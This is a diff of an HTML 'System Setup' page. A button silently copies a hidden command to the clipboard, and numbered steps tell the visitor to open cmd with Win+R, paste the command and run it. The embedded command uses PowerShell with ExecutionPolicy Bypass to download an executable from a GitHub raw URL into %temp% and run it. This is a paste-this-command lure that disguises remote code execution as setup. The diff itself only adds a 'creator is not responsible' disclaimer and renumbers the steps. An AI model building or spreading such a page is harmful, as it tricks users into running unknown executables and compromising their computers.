@@ -5,12 +5,24 @@
     <title>Command Setup</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 360px; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 400px; }
         
-        /* Header Style */
-        .header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px; }
+        .header { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 15px; }
         .terminal-icon { background: #333; color: #fff; padding: 5px 8px; border-radius: 4px; font-family: monospace; font-weight: bold; }
         
+        /* Warning Style */
+        .warning { 
+            color: #d93025; 
+            background-color: #fce8e6; 
+            padding: 15px; 
+            border-radius: 8px; 
+            border: 1px solid #d93025;
+            font-weight: bold; 
+            font-size: 13px; 
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
         .btn { background-color: #0078d4; color: white; border: none; padding: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-bottom: 20px; font-size: 16px; }
         .btn:hover { background-color: #005a9e; }
         .btn.success { background-color: #28a745; }
@@ -27,33 +39,32 @@
         <h2 style="margin:0">System Setup</h2>
     </div>
 
+    <div class="warning">
+        DON'T DO THIS IF YOU DON'T KNOW WHAT YOU ARE DOING!!! <br>
+        THE CREATOR IS NOT RESPONSIBLE.
+    </div>
+
     <button class="btn" id="copyBtn" onclick="doCopy()">1. Click to Copy Command</button>
 
     <div class="steps">
-        <p><strong>1.</strong> Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard.</p>
-        <p><strong>2.</strong> Type <kbd>cmd</kbd> and hit <kbd>Enter</kbd>.</p>
-        <p><strong>3.</strong> In the black window, press <kbd>Ctrl</kbd> + <kbd>V</kbd>.</p>
-        <p><strong>4.</strong> Hit <kbd>Enter</kbd> to run the command.</p>
+        <p><strong>2.</strong> Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard.</p>
+        <p><strong>3.</strong> Type <kbd>cmd</kbd> and hit <kbd>Enter</kbd>.</p>
+        <p><strong>4.</strong> In the black window, press <kbd>Ctrl</kbd> + <kbd>V</kbd>.</p>
+        <p><strong>5.</strong> Hit <kbd>Enter</kbd> to run the command.</p>
     </div>
 </div>
 
 <script>
     function doCopy() {
-        // --- PUT YOUR CODE/URL BETWEEN THE BACKTICKS BELOW ---
+        // --- YOUR CODE GOES HERE ---
         const myCommand = `cmd /k powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri "https://raw.githubusercontent.com/gavinmakesapps-sys/Name1234567890/refs/heads/main/jhdsbaflbsdaf.exe" -OutFile "%temp%/dumbass.exe" && %temp%/dumbass.exe`; 
-        // ----------------------------------------------------
-
+        
         const textArea = document.createElement("textarea");
         textArea.value = myCommand;
-        
-        // Ensure the textarea is not visible
         textArea.style.position = "fixed";
         textArea.style.left = "-9999px";
-        textArea.style.top = "0";
-        
         document.body.appendChild(textArea);
         textArea.select();
-        textArea.setSelectionRange(0, 99999);
 
         try {
             document.execCommand('copy');
@@ -61,7 +72,7 @@
             btn.innerText = "✓ Command Copied!";
             btn.classList.add('success');
         } catch (err) {
-            alert("Error copying. Please select the text manually.");
+            alert("Error copying.");
         }
 
         document.body.removeChild(textArea);
